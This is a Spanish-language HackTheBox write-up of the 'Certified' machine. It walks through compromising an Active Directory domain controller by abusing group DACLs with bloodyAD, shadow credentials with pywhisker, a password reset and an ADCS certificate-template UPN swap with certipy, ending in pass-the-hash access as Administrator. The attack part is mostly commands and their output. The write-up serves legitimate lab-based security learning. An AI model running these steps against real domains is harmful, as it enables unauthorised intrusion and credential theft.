---
title: "Máquina Certified"
description: "Resolución de la máquina Certified de HackTheBox"
tags: ["Leak", "AD", "Kerberoasting", "DACL Abuse", "Shadow Credentials", "ADCS"]
categories: ["HackTheBox", "Medium", "Windows"]
logo: "/assets/writeups/certified/logo.webp"
---

La credencial de uno de los empleados de una organización ha sido filtrada y nosotros la poseemos. Nos aprovecharemos de la cuenta en cuestión para comprometer el controlador de dominio del ente.

## Reconocimiento

Tenemos como punto de inicio las credenciales `judith.mader:judith09`. El DC tiene los siguientes puertos abiertos:

```bash
# Nmap 7.95 scan initiated Sat Nov  2 15:01:19 2024 as: nmap -sS -Pn -p- --open -oN ports --min-rate 300 -vvv -n 10.129.114.16
Nmap scan report for 10.129.114.16
Host is up, received user-set (0.15s latency).
Scanned at 2024-11-02 15:01:19 -04 for 400s
Not shown: 65514 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 127
88/tcp    open  kerberos-sec     syn-ack ttl 127
135/tcp   open  msrpc            syn-ack ttl 127
139/tcp   open  netbios-ssn      syn-ack ttl 127
389/tcp   open  ldap             syn-ack ttl 127
445/tcp   open  microsoft-ds     syn-ack ttl 127
464/tcp   open  kpasswd5         syn-ack ttl 127
593/tcp   open  http-rpc-epmap   syn-ack ttl 127
636/tcp   open  ldapssl          syn-ack ttl 127
3268/tcp  open  globalcatLDAP    syn-ack ttl 127
3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
5985/tcp  open  wsman            syn-ack ttl 127
9389/tcp  open  adws             syn-ack ttl 127
49666/tcp open  unknown          syn-ack ttl 127
49668/tcp open  unknown          syn-ack ttl 127
49677/tcp open  unknown          syn-ack ttl 127
49678/tcp open  unknown          syn-ack ttl 127
49681/tcp open  unknown          syn-ack ttl 127
49708/tcp open  unknown          syn-ack ttl 127
49727/tcp open  unknown          syn-ack ttl 127
49762/tcp open  unknown          syn-ack ttl 127

Read data files from: /usr/bin/../share/nmap
# Nmap done at Sat Nov  2 15:07:59 2024 -- 1 IP address (1 host up) scanned in 400.16 seconds
```

Veamos que hay por ahí.

## Intrusión

### Análisis

Esta usuaria no tiene acceso a muchas cosas:

```bash
❯ nxc smb certified.htb -u judith.mader -p judith09 --shares
SMB         10.10.11.41     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:certified.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.41     445    DC01             [+] certified.htb\judith.mader:judith09 
SMB         10.10.11.41     445    DC01             [*] Enumerated shares
SMB         10.10.11.41     445    DC01             Share           Permissions     Remark
SMB         10.10.11.41     445    DC01             -----           -----------     ------
SMB         10.10.11.41     445    DC01             ADMIN$                          Remote Admin
SMB         10.10.11.41     445    DC01             C$                              Default share
SMB         10.10.11.41     445    DC01             IPC$            READ            Remote IPC
SMB         10.10.11.41     445    DC01             NETLOGON        READ            Logon server share 
SMB         10.10.11.41     445    DC01             SYSVOL          READ            Logon server share 
```

Pero viendo los permisos que tiene sobre otros objetos con bloodhound, encontramos que:

![uh oh](/assets/writeups/certified/1.png)

Al sobreescribir el propietario de este grupo, ganaremos control sobre el y eso nos permitirá agregarnos al mismo.

Viendo que permisos tienen los usuarios que son parte de este grupo, vemos también que:

![uh oh x2](/assets/writeups/certified/2.png)

Esto nos permite hacer un ataque de Kerberoasting a la cuenta, podriamos intentar crackear el hash que obtengamos del ataque.

Finalmente, viendo que permisos tiene esa cuenta sobre otros objetos, notaremos un bonito `GenericAll` sobre el `ca_operator`

![uh oh x3](/assets/writeups/certified/3.png)

De aquí no tenemos más permisos. Pero viendo el nombre de la cuenta se puede apreciar que este DC tiene instalado el rol de servicios de certificados, y que esta cuenta parece un operador del mismo. Lo cual es una via potencial de escalar privilegios.

Además, que haya un ADCS también nos da un nuevo vector de ataque contra la cuenta sobre la que tendremos el permiso `GenericWrite`, y es utilizar una shadow credential (autenticarnos por certificados)

Resumiendo el camino a tomar para llegar a esa cuenta:

![Path](/assets/writeups/certified/4.png)

### Ejecución 

Primero vamos a establecernos como propietarios del grupo `Management` y luego agregarnos con bloodyAD:

```bash
❯ bloodyAD --host dc01.certified.htb -d certified.htb -u judith.mader -p judith09 set owner Management judith.mader
[+] Old owner S-1-5-21-729746778-2675978091-3820388244-512 is now replaced by judith.mader on Management
```

Ahora simplemente podemos darnos `GenericAll` sobre el grupo y agregarnos al mismo:

```bash
❯ bloodyAD --host dc01.certified.htb -d certified.htb -u judith.mader -p judith09 add genericAll Management judith.mader
[+] judith.mader has now GenericAll on Management
❯ bloodyAD --host dc01.certified.htb -d certified.htb -u judith.mader -p judith09 add groupMember Management judith.mader
[+] judith.mader added to Management
```

Por lo que entonces, ejecutando `pywhisker` para hacer un ataque de shadow credentials:

```bash
❯ pywhisker -t management_svc -a add -d certified.htb -u judith.mader -p judith09 -f owo.pfx                   
[*] Searching for the target account
[*] Target user found: CN=management service,CN=Users,DC=certified,DC=htb
[*] Generating certificate
[*] Certificate generated
[*] Generating KeyCredential
[*] KeyCredential generated with DeviceID: e8d927db-e2d6-8431-0a11-853cae66d14b
[*] Updating the msDS-KeyCredentialLink attribute of management_svc
[+] Updated the msDS-KeyCredentialLink attribute of the target object
[+] Saved PFX (#PKCS12) certificate & key at path: owo.pfx.pfx
[*] Must be used with password: hhHh5uPdrgduLF3ngGRW
[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
```

> Sí, he preferido hacer el shadow credentials sobre el Kerberoasting por razones obvias.
{: .prompt-info }

Ahora podemos hacer uso de [pkINITTools](https://github.com/dirkjanm/PKINITtools) para obtener un TGT con este certificado.

```bash
❯ gettgtpkinit.py -cert-pfx owo.pfx.pfx -pfx-pass hhHh5uPdrgduLF3ngGRW -dc-ip dc01.certified.htb 'certified.htb/management_svc' thing.ccache
2025-03-18 22:14:41,382 minikerberos INFO     Loading certificate and key from file
INFO:minikerberos:Loading certificate and key from file
2025-03-18 22:14:41,410 minikerberos INFO     Requesting TGT
INFO:minikerberos:Requesting TGT
2025-03-18 22:14:56,326 minikerberos INFO     AS-REP encryption key (you might need this later):
INFO:minikerberos:AS-REP encryption key (you might need this later):
2025-03-18 22:14:56,326 minikerberos INFO     df7d13439526633eb78e0ca1c24fd807a0423192c45a64f7e60d0ed1d2c53e0d
INFO:minikerberos:df7d13439526633eb78e0ca1c24fd807a0423192c45a64f7e60d0ed1d2c53e0d
2025-03-18 22:14:56,335 minikerberos INFO     Saved TGT to file
INFO:minikerberos:Saved TGT to file
❯ export KRB5CCNAME=thing.ccache 
❯ klist
Ticket cache: FILE:thing.ccache
Default principal: management_svc@CERTIFIED.HTB

Valid starting     Expires            Service principal
03/18/25 22:14:56  03/19/25 08:14:56  krbtgt/CERTIFIED.HTB@CERTIFIED.HTB
```

En el bloodhound, podemos ver que este usuario tiene privilegios para hacer PSRemote (conectarse con WinRM), asi que utilizando `evil-winrm` podemos conectarnos al host. Pero antes debemos ajustar nuestro `krb5.conf` con lo siguiente en la sección de realms ya que dicha herramienta utiliza las implementaciones nativas de Linux para Kerberos:

```conf
    CERTIFIED.HTB = {
		kdc = dc01.certified.htb
	}
```

Ahora nos podremos conectar sin problemas:

```bash
❯ evil-winrm -i dc01.certified.htb -r CERTIFIED.HTB
Evil-WinRM shell v3.6
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\management_svc\Documents>
```

En el escritorio de este usuario encontraremos la primera flag.

```bat
*Evil-WinRM* PS C:\Users\management_svc\Desktop> ls


    Directory: C:\Users\management_svc\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        3/18/2025  10:02 AM             34 user.txt
*Evil-WinRM* PS C:\Users\management_svc\Desktop> cat user.txt
784ac08f59d9cd7b8a276a82e4******
```

## Escalada de privilegios

Como ya sabemos, el usuario `management_svc` tiene el permiso `GenericAll` sobre `ca_operator`, por lo que podemos reiniciarle la contraseña y luego obtener un ticket como dicho usuario:

```bash
❯ bloodyAD --host dc01.certified.htb -d certified.htb -u management_svc -k set password ca_operator 'Password123!'
[+] Password changed successfully!
❯ getTGT.py 'certified.htb/ca_operator:Password123!'
Impacket v0.13.0.dev0+20241127.154729.af51dfd1 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in ca_operator.ccache
```

Vale pero... ¿y ahora qué hacemos?

Viendo las autoridades de certificados en el servidor, vemos que está `certified-DC01-CA` con un solo certificado interesante, podemos hacer peticiones a la CA para el dicho:

```bash
... [snip]
Certificate Templates
  0
    Template Name                       : CertifiedAuthentication
    Display Name                        : Certified Authentication
    Certificate Authorities             : certified-DC01-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectRequireDirectoryPath
                                          SubjectAltRequireUpn
    Enrollment Flag                     : NoSecurityExtension
                                          AutoEnrollment
                                          PublishToDs
    Private Key Flag                    : 16842752
    Extended Key Usage                  : Server Authentication
                                          Client Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Validity Period                     : 1000 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Permissions
      Enrollment Permissions
        Enrollment Rights               : CERTIFIED.HTB\operator ca
                                          CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : CERTIFIED.HTB\Administrator
        Write Owner Principals          : CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
                                          CERTIFIED.HTB\Administrator
        Write Dacl Principals           : CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
                                          CERTIFIED.HTB\Administrator
        Write Property Principals       : CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
                                          CERTIFIED.HTB\Administrator
... [snip]
```

Esa flag de `NoSecurityExtension`, según writeups y documentación en internet, dicen que nos permite cambiar el `userPrincipalName` (UPN) de nuestro usuario, y al pedir un certificado de autenticación con dicho UPN la CA nos lo dará en nombre de lo que esté en el UPN, sin importar si realmente somos ese usuario o no.

Evidentemente, como Windows no nos permite editar algunos de nuestros propios atributos vamos a tener que hacer lo primero desde la cuenta de `management_svc` y luego pedir el certificado usando la cuenta de `ca_operator`.

Al intentar lo dicho, vemos que efectivamente funciona:

```bash
# Con el ticket de management_svc
❯ certipy account update -k -u 'ca_operator@certified.htb' -target dc01.certified.htb -ns 10.10.11.41 -user ca_operator -upn Administrator
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Updating user 'ca_operator':
    userPrincipalName                   : Administrator
[*] Successfully updated 'ca_operator'
# Con el ticket de ca_operator
❯ certipy req -k -u 'ca_operator@certified.htb' -target dc01.certified.htb -ns 10.10.11.41 -ca certified-DC01-CA -template CertifiedAuthentication
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 6
[*] Got certificate with UPN 'Administrator'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'administrator.pfx'
```

Al intentar obtener un ticket, nos va a salir este error:

```bash
❯ certipy auth -pfx administrator.pfx -username Administrator -domain certified.htb -ns 10.10.11.41
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@certified.htb
[*] Trying to get TGT...
[-] Name mismatch between certificate and user 'administrator'
[-] Verify that the username 'administrator' matches the certificate UPN: Administrator
```

y esto es porque la cuenta `ca_operator` tiene el mismo UPN que la cuenta de administrador, ya que lo hemos cambiado. Asi que al revertirlo debería funcionar:

```bash
❯ certipy account update -k -u 'ca_operator@certified.htb' -target dc01.certified.htb -ns 10.10.11.41 -user ca_operator -upn ca_operator
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Updating user 'ca_operator':
    userPrincipalName                   : ca_operator
[*] Successfully updated 'ca_operator'
```

y... ¡et voila!

```bash
❯ certipy auth -pfx administrator.pfx -username Administrator -domain certified.htb -ns 10.10.11.41                                     
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@certified.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@certified.htb': aad3b435b51404eeaad3b435b51404ee:0d5b49608bbce1751f708748f67e2d34
```

Con el ticket o el hash podremos acceder al equipo y tomar la última flag.

```bash
❯ evil-winrm -i dc01.certified.htb -H '0d5b49608bbce1751f708748f67e2d34' -u Administrator
                                        
Evil-WinRM shell v3.6
                                                                    
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..
*Evil-WinRM* PS C:\Users\Administrator> cd Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> ls


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        3/18/2025  10:02 AM             34 root.txt


*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
1aa525101adf5506958b72cde4******
```